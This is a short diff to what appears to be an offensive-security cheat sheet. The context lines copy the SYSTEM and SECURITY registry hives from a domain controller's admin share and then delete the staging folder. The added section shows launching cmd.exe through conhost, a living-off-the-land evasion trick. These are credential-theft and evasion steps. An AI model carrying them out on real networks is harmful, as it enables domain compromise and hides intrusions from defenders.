@@ -11,3 +11,8 @@ xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\registry\SYSTEM" C:\<dc>
 xcopy "\\<dc>.<domain.local>\C$\Windows\Temp\xn--5o8hui\registry\SECURITY" C:\<dc>\
 rmdir /S C:\Windows\Temp\xn--5o8hui\
 ```
+
+# Run commands via [conhost](https://lolbas-project.github.io/lolbas/Binaries/Conhost/)
+```batchfile
+conhost cmd.exe
+```
